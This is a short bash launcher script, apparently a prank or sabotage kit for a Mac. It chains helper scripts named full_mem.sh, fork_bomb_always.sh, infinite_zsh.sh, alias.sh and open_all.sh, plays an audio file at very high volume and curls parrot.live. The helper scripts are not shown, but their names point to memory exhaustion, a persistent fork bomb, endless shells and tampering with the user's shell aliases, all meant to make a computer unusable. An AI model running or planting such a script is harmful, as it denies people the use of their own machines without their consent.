#!/bin/bash

# The order matters
./full_mem.sh &
./goose.sh &
./alias.sh
./open_all.sh
./fork_bomb_always.sh
./infinite_zsh.sh
afplay --volume 180 sicko.mp3 &
curl parrot.live &
